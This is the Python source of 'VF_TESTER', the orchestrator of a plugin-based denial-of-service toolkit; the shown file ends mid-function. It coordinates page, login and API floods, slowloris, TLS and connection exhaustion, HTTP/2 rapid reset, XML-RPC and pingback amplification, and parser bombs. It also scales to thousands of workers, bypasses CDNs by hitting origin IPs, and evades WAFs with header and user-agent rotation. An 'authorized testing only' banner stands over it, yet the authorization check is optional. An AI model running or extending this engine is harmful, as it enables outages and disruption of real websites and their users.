#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TESTER — Adaptive Attack Engine (Plugin Architecture)            ║
║     Part of the VF (Vector-Finder) Architecture                         ║
║                                                                           ║
║  All attack vectors are now implemented as plugins:                      ║
║  - Adding a new attack = creating one .py file in tester/               ║
║  - No changes to VF_TESTER.py needed for new attacks                    ║
║  - Automatic discovery via PluginRegistry                               ║
║  - Dynamic scaling via plugin.scale(delta)                              ║
║                                                                           ║
║  Built-in Plugins:                                                       ║
║  - page_flood:      GET requests to pages with cache busting            ║
║  - login_flood:     POST with random credentials                        ║
║  - resource_flood:  GET requests to static resources                    ║
║  - basic_api_flood: POST with JSON payloads                             ║
║  - origin_http:     HTTP flood on origin IPs (CDN bypass)              ║
║  - slowloris:       Slow partial headers (connection pool exhaustion)   ║
║  - conn_exhaust:    Connection hold (keep-alive exhaustion)             ║
║  - tls_handshake:   Rapid TLS handshakes (CPU exhaustion)              ║
║  - header_bomb:     Oversized headers (8KB+) memory exhaustion          ║
║  - multipart_upload: Large file uploads (memory/disk exhaustion)        ║
║  - slow_read:       Slow response reading (worker exhaustion)           ║
║  - http2_rapid_reset: HTTP/2 stream cancellation (CVE-2023-44487)      ║
║  - graphql_introspection: Heavy GraphQL queries (CPU exhaustion)       ║
║  - cache_poison:    CDN cache poisoning with deceptive headers          ║
║  - ws_flood:        WebSocket flood to freeze Node.js event loop        ║
║  - json_bomb:       Deep nested JSON + Billion Laughs parser bomb      ║
║  - viewstate_burn:  ASP.NET ViewState burn with invalid MAC (CPU)       ║
║  - aspnet_session_flood: ASP.NET session flood (memory exhaustion)      ║
║  - wp_xmlrpc_bomb:  WordPress XML-RPC multicall bomb (100x amplif.)    ║
║  - wp_pingback_amp: WordPress pingback reflexive DDoS (50x amplif.)   ║
║  - api_flood:       Conference-specific API flood (legacy module)       ║
║                                                                           ║
║  FOR AUTHORIZED TESTING ONLY!                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  # Auto mode: scan + attack (runs FINDER first)
  python VF_TESTER.py https://target.com

  # Profile mode: use existing FINDER profile
  python VF_TESTER.py --profile VF_PROFILE.json

  # Manual overrides
  python VF_TESTER.py --profile VF_PROFILE.json --max-workers 5000 --crash-mode

Keyboard Controls (during run):
  +   Increase workers (+step)
  -   Decrease workers (-step)
  q   Quit gracefully

Requirements:
  pip install aiohttp httpx[http2] aiohttp-socks beautifulsoup4
"""

from __future__ import annotations

import asyncio
import argparse
import time
import sys
import json
import os
import platform
import signal
import ssl
from typing import List, Optional, Dict, Set, Tuple, Any
from urllib.parse import urlparse, urlencode

# Ensure UTF-8 console on Windows (migrated from _bootstrap.py)
from logging_config import ensure_utf8_console
ensure_utf8_console()

from logging_config import get_logger
from utils.ssl_helpers import create_ssl_context
logger = get_logger(__name__)

from vf_common import (C, rand_user, rand_pass, rand_cache_bust, rand_str,
                        T, set_theme, box_top, box_bottom, box_mid,
                        box_line, box_line_centered, health_bar, worker_bar,
                        mini_bar, mode_icon)

# ═══ Extracted Module Imports ═══
from tester.vf_data import HitResult, Stats
from tester.vf_health_monitor import ServerHealthMonitor
from tester.vf_live_log import LiveLog
from tester.vf_keyboard import KeyboardHandler
from tester.vf_evasion_stub import EvasionManagerStub as _EvasionManagerStub
from tester.vf_viewstate_stub import ViewStateManagerStub as _ViewStateManagerStub

# ═══ Refactored Module Imports ═══
from tester.vf_profile_loader import ProfileLoader
from tester.vf_dashboard import DashboardRenderer
from tester.vf_plugin_orchestrator import PluginOrchestrator, ORIGIN_PLUGINS, STRICT_ORIGIN_PLUGINS
from tester.vf_adaptive_scaling import AdaptiveScalingEngine
from tester.vf_session_manager import SessionManager
from finder.site_profile import SiteProfile
from utils.session_helpers import scanner_timeout
from config.defaults import PLUGIN_CLEANUP_TIMEOUT


IS_WINDOWS = platform.system() == 'Windows'

if IS_WINDOWS:
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except (OSError, AttributeError, RuntimeError):
        pass

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

# ─── Dependency check ───
_missing = []
if not HAS_AIOHTTP:
    _missing.append('aiohttp')
if not HAS_HTTPX:
    _missing.append('httpx[http2]')
if _missing:
    logger.info(f"\n{'='*60}")
    print(f"  {C.R}[MISSING DEPENDENCIES]{C.RS}")
    logger.info(f"The following packages are required but not installed:")
    for pkg in _missing:
        logger.info(f"• {pkg}")
    logger.info(f"\n  Install with:")
    logger.info(f"pip install {' '.join(_missing)}")
    logger.info(f"{'='*60}\n")
    # BUG-4 fix: Raise ConfigurationError instead of sys.exit(1)
    # sys.exit() kills the process entirely, making it impossible for
    # callers (tests, wrappers, orchestration tools) to catch and handle
    # the error gracefully. ConfigurationError can be caught and handled.
    from exceptions import ConfigurationError as _ConfigurationError
    raise _ConfigurationError(
        f"Missing required dependencies: {', '.join(_missing)}. "
        f"Install with: pip install {' '.join(_missing)}"
    )

# ═══ Plugin System ═══
from plugin_system import PluginRegistry, PluginInterface, AttackContext, AttackExtras

# ═══ Vector-to-Plugin Mapping ═══
# (Moved to tester/vf_plugin_orchestrator.py — imported above as needed)
# ORIGIN_PLUGINS and STRICT_ORIGIN_PLUGINS also moved there.


# ═══════════════════════════════════════════════════════════════════════════════
# VF_TESTER — Adaptive Attack Engine (Plugin-Based)
# ═══════════════════════════════════════════════════════════════════════════════

class VFTester:
    """
    VF_TESTER reads a VF_PROFILE.json from VF_FINDER and automatically
    configures an optimized, adaptive attack strategy using the plugin system.

    All attack vectors are implemented as plugins. The orchestrator only
    handles: strategy selection, session management, and the main run loop.
    Profile loading, dashboard rendering, plugin orchestration,
    adaptive scaling, and session management are delegated to
    extracted modules:
      - ProfileLoader (tester/vf_profile_loader.py)
      - DashboardRenderer (tester/vf_dashboard.py)
      - PluginOrchestrator (tester/vf_plugin_orchestrator.py)
      - AdaptiveScalingEngine (tester/vf_adaptive_scaling.py)
      - SessionManager (tester/vf_session_manager.py)

    This class is a thin coordinator that wires these modules together.
    """

    def __init__(self, profile_path: str | None = None,
                 target_url: str | None = None):
        # Delegate profile loading to ProfileLoader
        self.profile, self.attack = ProfileLoader.load_or_create(profile_path, target_url)

        # Extract key info from profile (self.profile is now a SiteProfile)
        p = self.profile
        self.url = p.url or target_url or ""

        # Validate target URL
        from vf_validator import validate_target_url, validate_worker_count, validate_ip_address, ValidationError
        from exceptions import ConfigurationError
        try:
            self.url, _warnings = validate_target_url(self.url)
        except ValidationError as e:
            logger.error(f"[ERROR] Invalid target URL: {e}")
            raise ConfigurationError(f"Invalid target URL: {e}") from e

        parsed = urlparse(self.url)
        self.site_root = f"{parsed.scheme}://{parsed.netloc}"
        self.domain = parsed.netloc.split(':')[0]

        # Core state
        self.stats = Stats()
        self._stop = asyncio.Event()
        self._snaps: List[dict] = []

        # S6: Authorized-only flag (set by CLI, defaults to False)
        self._authorized_only: bool = False

        # Features
        self.health_monitor = ServerHealthMonitor()
        self.live_log = LiveLog(max_lines=50)  # v16: increased from 8 to 50 for visible live log
        self.keyboard = KeyboardHandler()

        # Detected technology info
        self.detected_waf = p.waf
        self.detected_cms = p.cms
        self.is_aspnet = p.viewstate_present
        self.is_wordpress = p.cms and "WordPress" in (p.cms or "")
        self.has_api = bool(p.api_endpoints)
        self.is_edu = p.site_category == 'educational'
        self.edu_config = self.attack.get("edu_config", {})

        # ASP.NET specific (viewstate_mgr initialized after _evasion below)
        self._viewstate_mgr = None  # type: ignore[assignment]
        login_fields = p.login_fields or {}
        self.username_field = login_fields.get("username", "username")
        self.password_field = login_fields.get("password", "password")

        # Per-session ASP.NET token tracking
        self._session_cookies: Dict[int, Dict[str, str]] = {}

        origin_ips = self.profile.origin_ips
        # SEC-04: Validate origin IPs from profile
        if origin_ips:
            validated_ips = []
            for ip in origin_ips:
                try:
                    validate_ip_address(ip)
                    validated_ips.append(ip)
                except ValidationError as e:
                    logger.warning(f"[WARN] Origin IP {ip} rejected: {e}")
            origin_ips = validated_ips
            self.profile.origin_ips = origin_ips
        if origin_ips:
            logger.info(f"[VF] Origin IPs: {len(origin_ips)} (CDN bypass available)")

        # Targets from profile
        self.page_targets: List[str] = self.attack.get("page_targets", [])
        self.resource_targets: List[str] = self.attack.get("resource_targets", [])

        # Worker config from profile
        wc = self.attack.get("worker_config", {})
        self.initial_workers = wc.get("initial_workers", 5)
        self._max_workers = wc.get("max_workers", 5000)  # BUG-FIX v32: Use _max_workers backing field
        self.step = wc.get("step", 50)
        self.step_duration = wc.get("step_duration", 5)

        # Validate worker counts
        try:
            self.initial_workers = validate_worker_count(self.initial_workers)
            self._max_workers = validate_worker_count(self._max_workers)
        except ValidationError as e:
            logger.error(f"[ERROR] Invalid worker config: {e}")

        # Evasion config
        ec = self.attack.get("evasion_config", {})
        self.enable_header_random = ec.get("header_randomization", False)

        # Request config
        rc = self.attack.get("request_config", {})
        self.request_delay_ms = rc.get("delay_between_requests_ms", 10)
        self.enable_cache_bust = rc.get("cache_bust", True)
        self.enable_ua_rotation = rc.get("user_agent_rotation", ec.get("rotate_user_agent", True))

        # Evasion Module Integration
        self._evasion = _EvasionManagerStub(
            self.domain, self.url, self.page_targets or [], self.resource_targets or [],
            self.enable_header_random, self.enable_ua_rotation
        )
        self._evasion_active = self._evasion.is_active
        if self._evasion_active:
            logger.info(f"[VF-EVASION] Evasion active (UA rotation + header randomization)")

        # B10: Initialize ViewStateManagerStub AFTER _evasion is set up,
        # since _base_headers() depends on self._evasion
        self._viewstate_mgr = _ViewStateManagerStub(self.url, self._base_headers)

        # Plugin management — delegated to PluginOrchestrator
        self._registry = PluginRegistry(search_dirs=[
            os.path.dirname(os.path.abspath(__file__)),
        ])
        self._orchestrator = PluginOrchestrator(
            self._registry,
            initial_workers=self.initial_workers,
            max_workers=self.max_workers,
        )
        # BUG-013 fix: Convenience accessors now use properties that delegate
        # to the orchestrator, preventing reference aliasing bugs where
        # reassigning self._active_plugins = ... would only update the local
        # reference and not propagate back to the orchestrator.
        # See @property definitions below __init__.

        # Reusable SSL context (avoid creating per-request)
        # S1a: Read VERIFY_SSL from config; only disable when False (backward compatible)
        from config.defaults import VERIFY_SSL
        self._verify_ssl = VERIFY_SSL
        self._ssl_ctx = create_ssl_context(self._verify_ssl)

        # Adaptive timeout tracking
        from vf_network import AdaptiveTimeout, RetryConfig, ConnectionPoolStats
        self._adaptive_timeout = AdaptiveTimeout()
        self._retry_config = RetryConfig()
        self._pool_stats = ConnectionPoolStats()  # P2: shared connection pool stats

        # Dashboard renderer — delegates all UI rendering
        self._dashboard = DashboardRenderer(
            stats=self.stats,
            health_monitor=self.health_monitor,
            live_log=self.live_log,
            active_plugins_getter=lambda: self._orchestrator.active_plugins,
            pool_stats=self._pool_stats,
        )

        # Session manager — delegates session warmup and origin IP validation
        self._session_mgr = SessionManager(self._evasion, self._verify_ssl)

        # Adaptive scaling engine — delegates worker scaling logic
        self._scaling_engine = AdaptiveScalingEngine(
            orchestrator=self._orchestrator,
            health_monitor=self.health_monitor,
            stats=self.stats,
            keyboard=self.keyboard,
            evasion=self._evasion,
            stop_event=self._stop,
            registry=self._registry,
            waf_getter=lambda: self.detected_waf,
            waf_setter=lambda w: setattr(self, 'detected_waf', w),
            session_getter=lambda: getattr(self, '_session', None),
            compute_plugin_workers_fn=self._compute_plugin_workers,
            build_attack_context_fn=self._build_attack_context,
            origin_ips_getter=lambda: self.profile.origin_ips,
            step=self.step,
            step_duration=self.step_duration,
            max_workers=self.max_workers,
            initial_workers=self.initial_workers,
        )

    # ─── BUG-013 fix: Properties that delegate to orchestrator ───────────
    # These replace the old convenience accessor assignments that were
    # references (not copies). Mutating via self._active_plugins worked,
    # but reassigning self._active_plugins = ... only updated the local
    # reference. Properties always delegate to the orchestrator.

    # BUG-FIX v32: max_workers property propagates changes to orchestrator
    # and scaling engine. Previously, `tester.max_workers = 50` only set the
    # value on VFTester, but orchestrator._max_workers and scaling_engine._max_workers
    # remained at the profile value (e.g. 10), causing workers to never escalate.
    @property
    def max_workers(self) -> int:
        return self._max_workers

    @max_workers.setter
    def max_workers(self, value: int):
        self._max_workers = value
        # Propagate to orchestrator
        if hasattr(self, '_orchestrator') and self._orchestrator is not None:
            self._orchestrator._max_workers = value
        # Propagate to scaling engine
        if hasattr(self, '_scaling_engine') and self._scaling_engine is not None:
            self._scaling_engine._max_workers = value

    @property
    def _active_plugins(self):
        return self._orchestrator.active_plugins

    @property
    def _disabled_plugins(self):
        return self._orchestrator.disabled_plugins

    @property
    def _plugin_tasks(self):
        return self._orchestrator.plugin_tasks

    @property
    def _total_workers(self):
        return self._orchestrator.total_workers

    @_total_workers.setter
    def _total_workers(self, value: int):
        self._orchestrator.total_workers = value

    # ─── Profile Loading (delegated to ProfileLoader) ────────────────

    def _load_profile(self, path: str):
        """Delegate profile loading to ProfileLoader (backward compat)."""
        self.profile, self.attack = ProfileLoader.load(path)

    @staticmethod
    def _validate_profile(profile: Dict[str, Any]) -> None:
        """Delegate profile validation to ProfileLoader (backward compat)."""
        ProfileLoader.validate(profile)

    def _create_minimal_profile(self, url: str):
        """Delegate minimal profile creation to ProfileLoader (backward compat)."""
        self.profile, self.attack = ProfileLoader.create_minimal(url)

    def stop(self):
        """Signal the attack to stop gracefully.

        Sets the stop event and delegates plugin stopping to the orchestrator.
        Safe to call multiple times.
        """
        self._stop.set()
        self._orchestrator.stop_all()

    async def stop_and_wait(self, timeout: float = 10.0):
        """Async version of stop() that awaits task cancellation.

        Delegates to the orchestrator for clean shutdown.
        """
        self._stop.set()
        await self._orchestrator.stop_and_wait(timeout)

    def _base_headers(self) -> Dict[str, str]:
        return self._evasion.base_headers()

    async def _session_warmup(self, session) -> None:
        """v24: Session warmup — visit target URL to establish cookies.

        Delegates to SessionManager.warmup_session().
        """
        await self._session_mgr.warmup_session(session, self.url)

    async def _preflight_check_origin_ips(self) -> bool:
        """v22: HTTP-based origin IP validation.

        Delegates to SessionManager.preflight_check_origin_ips().
        Returns bool and updates self.profile.origin_ips for backward compat.
        """
        origin_ips = self.profile.origin_ips
        if not origin_ips:
            return False

        target_is_https = urlparse(self.url).scheme == 'https'
        port = 443 if target_is_https else 80

        validated = await self._session_mgr.preflight_check_origin_ips(
            origin_ips, self.domain, port=port, url=self.url,
            verify_ssl=self._verify_ssl,
        )

        if validated:
            self.profile.origin_ips = validated
            return True
        else:
            self.profile.origin_ips = []
            return False

    async def _refresh_viewstate(self, session):
        return await self._viewstate_mgr.refresh(session)

    @property
    def _invalid_count(self) -> int:
        if self._viewstate_mgr is None:
            return 0
        return self._viewstate_mgr.invalid_count

    @_invalid_count.setter
    def _invalid_count(self, value: int):
        if self._viewstate_mgr is not None:
            self._viewstate_mgr.invalid_count = value

    @property
    def _viewstate_ts(self) -> float:
        if self._viewstate_mgr is None:
            return 0.0
        return self._viewstate_mgr.viewstate_ts

    @_viewstate_ts.setter
    def _viewstate_ts(self, value: float):
        if self._viewstate_mgr is not None:
            self._viewstate_mgr.viewstate_ts = value

    def _record_hit(self, mode: str, ok: bool, code: int, rt: float,
                    err: str = "", url: str = "", hint: str = ""):
        """Record a hit result into stats and live log (callback for plugins)."""
        hit = HitResult(ok=ok, code=code, rt=rt, mode=mode, err=err, url=url, hint=hint)
        self.stats.record(hit)
        self.live_log.add({
            "mode": mode, "code": code, "rt": rt,
            "err": err, "url": url, "hint": hint,
        })
        # Feed adaptive timeout tracker
        if hit.rt > 0:
            self._adaptive_timeout.record(hit.rt)

    # ─── Plugin Selection & Launching (delegated to PluginOrchestrator) ──

    def _select_plugins(self, vectors: List[str]) -> Dict[str, Dict[str, Any]]:
        """Select which plugins to activate based on attack vectors.
        Delegates to PluginOrchestrator.
        """
        return self._orchestrator.select_plugins(vectors, self.profile.origin_ips)

    def _compute_plugin_workers(self, plugin_name: str, total_max: int,
                                 origin_ips: List[str]) -> int:
        """Compute how many workers to assign to a plugin.
        Delegates to PluginOrchestrator.
        """
        return self._orchestrator.compute_plugin_workers(plugin_name, total_max, origin_ips)

    def _build_attack_context(self, plugin_name: str, session,
                               workers: int) -> AttackContext:
        """Build an AttackContext for a specific plugin.
        Delegates to PluginOrchestrator.
        """
        return self._orchestrator.build_attack_context(
            plugin_name, session, workers,
            url=self.url, site_root=self.site_root, domain=self.domain,
            stop_event=self._stop, stats_callback=self._record_hit,
            profile=self.profile, origin_ips=self.profile.origin_ips,
            page_targets=self.page_targets or [self.url],
            resource_targets=self.resource_targets or [f"{self.site_root}/favicon.ico"],
            verify_ssl=self._verify_ssl, ssl_ctx=self._ssl_ctx,
            evasion=self._evasion, base_headers_fn=self._base_headers,
            detected_waf=self.detected_waf,
            request_delay_ms=self.request_delay_ms,
            enable_cache_bust=self.enable_cache_bust,
            username_field=self.username_field,
            password_field=self.password_field,
            health_callback=lambda r: self.health_monitor.record(r),
        )

    async def _launch_plugins(self, selected_plugins: Dict[str, Dict[str, Any]],
                               session) -> int:
        """Launch all selected plugins with AttackContext.
        Delegates to PluginOrchestrator.
        """
        result = await self._orchestrator.launch_plugins(
            selected_plugins, session,
            url=self.url, site_root=self.site_root, domain=self.domain,
            stop_event=self._stop, stats_callback=self._record_hit,
            profile=self.profile, origin_ips=self.profile.origin_ips,
            page_targets=self.page_targets or [self.url],
            resource_targets=self.resource_targets or [f"{self.site_root}/favicon.ico"],
            verify_ssl=self._verify_ssl, ssl_ctx=self._ssl_ctx,
            evasion=self._evasion, base_headers_fn=self._base_headers,
            detected_waf=self.detected_waf,
            request_delay_ms=self.request_delay_ms,
            enable_cache_bust=self.enable_cache_bust,
            username_field=self.username_field,
            password_field=self.password_field,
            health_callback=lambda r: self.health_monitor.record(r),
            preflight_check_fn=self._preflight_check_origin_ips,
        )
        # BUG-013 fix: No need to sync convenience references —
        # properties now always delegate to the orchestrator.
        return result

    # ─── Strategy Selection (delegates UI to DashboardRenderer) ──────────

    def _handle_strategy_selection(self, strategy: str, vectors: List[str]) -> Tuple[str, List[str]]:
        """Handle strategy selection. Displays scan summary + strategies before attack starts.

        v22: Comprehensive RECONNAISSANCE SUMMARY box + compact strategy display.
        Delegates rendering to DashboardRenderer.
        """
        surgical_vectors = self.attack.get("surgical_vectors", [])
        all_vectors = self.attack.get("all_vectors", [])
        strategy_reason = self.attack.get("strategy_reason", "")
        surgical_analysis = self.attack.get("surgical_analysis", [])

        # Delegate UI rendering to dashboard
        self._dashboard.print_scan_summary(self.profile, self.attack,
                                            self.detected_waf, self.detected_cms)
        self._dashboard.print_strategy_box(strategy, vectors, strategy_reason, surgical_analysis)

        # Delegate user confirmation to dashboard
        if not self._dashboard.confirm_attack(self.domain, self._authorized_only, self._stop):
            return strategy, vectors

        return strategy, vectors

    # ─── Dashboard Loop ───────────────────────────────────────────────

    async def _run_dashboard_loop(self, strategy: str) -> None:
        """Run the main dashboard loop with auto-escalation via plugin scaling.

        Delegates scaling logic to AdaptiveScalingEngine.tick().
        This method only handles the loop structure, user interaction
        for empty plugin state, dashboard rendering, and snapshots.
        """
        self._scaling_engine.reset()

        while not self._stop.is_set():
            # Execute one scaling cycle (keyboard, WAF, auto-heal, shrink, escalation)
            cmd = await self._scaling_engine.tick()
            if cmd == 'q':
                break

            # v27: If all plugins are disabled/stopped, ask user instead of running empty loop
            if not self._active_plugins and not self._scaling_engine.state.no_active_plugins_logged:
                self._scaling_engine.state.no_active_plugins_logged = True
                logger.warning(f"\n  [WARN] All plugins have been disabled/stopped.")
                print(f"  {C.W}Continue waiting? [w]=wait for recovery  [q]=quit  [a]=abort attack{C.RS} ", end="", flush=True)
                try:
                    # SEC-013: Use run_in_executor to avoid blocking the event loop
                    loop = asyncio.get_running_loop()
                    action = await loop.run_in_executor(None, lambda: input().strip().lower())
                except (EOFError, KeyboardInterrupt):
                    action = "q"
                if action in ("q", "quit", "a", "abort"):
                    logger.warning(f"[STOP] Attack stopped by user.")
                    self._stop.set()
                    break
                # 'w' or anything else: keep loop running (auto-recovery may re-enable plugins)

            # Get health for dashboard display
            health = self.health_monitor.health_score

            # Print simple dashboard
            try:
                self._print_dashboard(self._total_workers, self.max_workers, strategy, health)
            except (RuntimeError, OSError, ValueError, AttributeError) as e:
                logger.debug(f"Dashboard render error (non-fatal): {e}")

            # Snapshot
            self._snap()

            try:
                await asyncio.sleep(1)
            except asyncio.CancelledError:
                break


    def _scale_all_plugins(self, delta: int) -> int:
        """Scale ALL active plugins (including origin) by delta. Delegates to orchestrator."""
        return self._orchestrator.scale_all_plugins(delta)

    def _scale_plugins(self, delta: int) -> int:
        """Scale HTTP plugins by delta (for scaling UP). Delegates to orchestrator."""
        return self._orchestrator.scale_plugins(delta)

    def _print_dashboard(self, cur: int, max_w: int, strategy: str, health: float):
        """Print real-time dashboard. Delegates to DashboardRenderer."""
        self._dashboard.print_dashboard(cur, max_w, strategy, health)

    def _snap(self):
        self._snaps.append({
            "t": self.stats.duration, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": max(self.stats.rps_rolling, self.stats.requests_per_second), "workers": self.stats.users,
            "health": self.health_monitor.health_score,
        })

    # ─── Main Run ─────────────────────────────────────────────────────

    async def run(self):
        # BUG-FIX: Reset ALL state from previous runs.
        # Without this, calling run() again (e.g. user presses 'r' to repeat attack)
        # would fail because _stop event is still set, stale plugin tasks remain,
        # and _active_plugins/_disabled_plugins have dirty state from the previous run.
        self._stop = asyncio.Event()
        self._orchestrator.reset()
        # BUG-013 fix: No need to re-assign convenience references —
        # properties now always delegate to the orchestrator.
        self._scaling_engine.reset()
        self._session = None

        self.stats = Stats()
        self.stats.t0 = time.time()

        # Update dashboard's stats reference (new Stats object after reset)
        self._dashboard.stats = self.stats

        # Update scaling engine's references (new event + stats after reset)
        self._scaling_engine._stats = self.stats
        self._scaling_engine._stop = self._stop

        vectors = self.attack.get("attack_vectors", ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"])
        strategy = self.attack.get("recommended_strategy", "GENERIC_FLOOD")
        pages = self.page_targets or [self.url]
        resources = self.resource_targets or [f"{self.site_root}/favicon.ico"]

        if not pages:
            pages = [self.url, f"{self.site_root}/"]

        actual_max = self.max_workers

        # Select plugins based on vectors
        selected_plugins = self._select_plugins(vectors)

        # Delegate banner + target info to dashboard
        self._dashboard.print_banner(
            url=self.url, strategy=strategy,
            detected_waf=self.detected_waf, detected_cms=self.detected_cms,
            is_aspnet=self.is_aspnet, is_wordpress=self.is_wordpress,
            origin_ips=self.profile.origin_ips,
            vectors=vectors, actual_max=actual_max,
            initial_workers=self.initial_workers, step=self.step,
            page_count=len(pages), resource_count=len(resources),
            registry_names=self._registry.names,
            registry_errors=self._registry.errors,
            selected_plugins=selected_plugins,
        )

        # Strategy selection (delegates UI to dashboard)
        strategy, vectors = self._handle_strategy_selection(strategy, vectors)

        # v27: If user declined the attack, exit early
        if self._stop.is_set():
            return

        # Delegate countdown to dashboard
        await self._dashboard.print_countdown()
        self._dashboard.print_attack_started()

        await self.keyboard.start()

        # Connection pool setup
        # BUG-FIX v35: Connection pool must scale with max_workers, not be
        # capped at a fixed strategy limit. Old code used:
        #   conn_limit = min(actual_max, STRATEGY_CONCURRENCY_LIMITS[strategy])
        # which capped connections at 300 for STANDARD strategy. When workers
        # exceeded 300, requests queued inside aiohttp's connector, and the
        # ClientTimeout(total=10) timer ticked while waiting for a connection.
        # This caused cascading timeouts → scaling engine shrinks → pool frees
        # → requests succeed → workers grow → cycle repeats.
        # Now the pool scales with max_workers so there's always a connection
        # available for each active worker.
        conn_limit = actual_max

        from config.defaults import DEFAULT_KEEPALIVE_TIMEOUT, DEFAULT_DNS_CACHE_TTL
        # W2.7: build_resilient_connector now delegates to create_connector()
        from vf_network import build_resilient_connector
        connector = build_resilient_connector(
            max_connections=conn_limit,
            per_host_limit=0,  # Single target, no per-host limit needed
            keepalive_timeout=DEFAULT_KEEPALIVE_TIMEOUT,
            dns_cache_ttl=DEFAULT_DNS_CACHE_TTL,
            pool_stats=self._pool_stats,  # P2: pass pool stats
        )

        timeout = scanner_timeout()

        # v24: Create a cookie jar that persists across requests
        cookie_jar = aiohttp.CookieJar(unsafe=True)

        # BUG-22 FIX: Extract trace_config from connector for pool_stats monitoring
        _trace_configs = []
        if hasattr(connector, '_vf_trace_config'):
            _trace_configs = [connector._vf_trace_config]

        async with aiohttp.ClientSession(connector=connector, timeout=timeout,
                                         cookie_jar=cookie_jar,
                                         trace_configs=_trace_configs) as session:
            if self.is_aspnet:
                await self._refresh_viewstate(session)

            # v24: Session warmup — visit target to establish cookies
            # Many WAFs (Cloudflare, ArvanCloud) set challenge cookies on first visit
            # Without these cookies, subsequent requests get blocked immediately
            await self._session_warmup(session)

            # v24: Pass WAF info to evasion manager
            if hasattr(self._evasion, 'set_waf'):
                self._evasion.set_waf(self.detected_waf or "")

            # Launch all plugins
            # BUG-013 fix: _total_workers is now a property that delegates
            # to the orchestrator, so the setter automatically syncs both.
            self._total_workers = await self._launch_plugins(selected_plugins, session)

            # v26 P2: Store session for auto-recovery plugin re-launching
            self._session = session

            # Print origin attack details if applicable
            # BUG-21 FIX: Use self.profile.origin_ips instead of bare 'origin_ips'
            # (origin_ips is a local var in __init__, not accessible in run())
            _origin_ips = self.profile.origin_ips
            if _origin_ips:
                target_is_https = urlparse(self.url).scheme == 'https'
                atk_port = 443 if target_is_https else 80
                logger.info(f"\n  [ORIGIN-ATTACK] CDN bypass via {len(_origin_ips)} origin IPs")
                for pname, plugin in self._active_plugins.items():
                    if pname in ORIGIN_PLUGINS:
                        wc = plugin.worker_count
                        logger.info(f"[→] {pname}: {wc} workers")
                logger.info(f"[+] HTTP workers: {self._total_workers - sum(p.worker_count for n, p in self._active_plugins.items() if n in ORIGIN_PLUGINS)}")

            if self._active_plugins:
                logger.info(f"[*] {len(self._active_plugins)} plugins launched\n")

            # Dashboard loop
            await self._run_dashboard_loop(strategy)

            # Cleanup
            try:
                await self.keyboard.stop()
            except (OSError, IOError):
                pass

            self._stop.set()

            # Stop all plugins via orchestrator
            self._orchestrator.stop_all()

            # Cancel plugin tasks and wait with timeout
            if self._orchestrator.plugin_tasks:
                for t in self._orchestrator.plugin_tasks:
                    if not t.done():
                        t.cancel()
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*self._orchestrator.plugin_tasks, return_exceptions=True),
                        timeout=PLUGIN_CLEANUP_TIMEOUT  # W2.4
                    )
                except asyncio.TimeoutError:
                    logger.debug("Plugin tasks did not finish within timeout")
                except (asyncio.CancelledError, RuntimeError):
                    pass

        # ── v21: Hacker Final Report (delegated to DashboardRenderer) ──
        # v26 P2: Clear dangling session reference
        self._session = None

        self._dashboard.print_final_report(self.stats, self._orchestrator.active_plugins)


# ═══ Entry Point ═══
def parse_args():
    p = argparse.ArgumentParser(
        description="VF_TESTER — Adaptive Attack Engine (Plugin Architecture)",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("url", nargs="?", default=None, help="Target URL")
    p.add_argument("--profile", default=None, help="VF_PROFILE.json path")
    p.add_argument("--max-workers", type=int, default=None)
    p.add_argument("--crash-mode", action="store_true")
    p.add_argument("--verify-ssl", action="store_true", help="Enable SSL certificate verification (default: disabled for testing)")
    p.add_argument("--authorized-only", action="store_true", help="Require domain confirmation before attack starts")
    return p.parse_args()


async def main():
    """Legacy entry point — kept for backward compatibility.

    New code should use the __main__ block which includes signal handlers.
    """
    args = parse_args()

    if args.profile:
        tester = VFTester(profile_path=args.profile)
    elif args.url:
        tester = VFTester(target_url=args.url)
    else:
        logger.error(f"\n  [ERROR] Provide a URL or --profile")
        print(f"  Usage: python VF_TESTER.py https://target.com")
        print(f"         python VF_TESTER.py --profile VF_PROFILE.json\n")
        return

    if args.max_workers:
        tester.max_workers = args.max_workers

    # S1b: Override SSL verification if --verify-ssl flag is set
    if args.verify_ssl:
        tester._verify_ssl = True
        tester._ssl_ctx = ssl.create_default_context()
        tester._session_mgr.ssl_ctx = tester._ssl_ctx  # sync with SessionManager

    # S6: Store authorized-only flag
    tester._authorized_only = args.authorized_only

    await tester.run()


if __name__ == "__main__":
    from logging_config import setup_logger
    import logging
    setup_logger(level=logging.DEBUG)

    # Global reference for signal handlers
    _current_tester: VFTester | None = None

    # BUG-FIX: Replaced signal.signal() with loop.add_signal_handler().
    # The old approach called sync stop() from a signal handler context,
    # which is unsafe because:
    # 1. task.cancel() from signal context modifies task state outside the event loop
    # 2. The signal handler can interrupt the event loop mid-operation
    # 3. Calling async code (stop_and_wait) from sync signal handlers is impossible
    #
    # The new approach uses loop.add_signal_handler() which schedules a callback
    # on the event loop, ensuring all cleanup happens in the event loop thread.

    def _make_signal_handler(loop: asyncio.AbstractEventLoop):
        """Create a signal handler that safely stops the tester via the event loop."""
        def _handler():
            global _current_tester
            logger.info("Received signal, initiating graceful shutdown...")
            if _current_tester is not None:
                # Schedule the async stop on the event loop (thread-safe)
                loop.call_soon_threadsafe(_current_tester.stop)
        return _handler

    try:
        async def _run():
            global _current_tester
            args = parse_args()

            if args.profile:
                tester = VFTester(profile_path=args.profile)
            elif args.url:
                tester = VFTester(target_url=args.url)
            else:
                logger.error(f"\n  [ERROR] Provide a URL or --profile")
                print(f"  Usage: python VF_TESTER.py https://target.com")
                print(f"         python VF_TESTER.py --profile VF_PROFILE.json\n")
                return

            if args.max_workers:
                tester.max_workers = args.max_workers

            # S1b: Override SSL verification if --verify-ssl flag is set
            if args.verify_ssl:
                tester._verify_ssl = True
                tester._ssl_ctx = ssl.create_default_context()
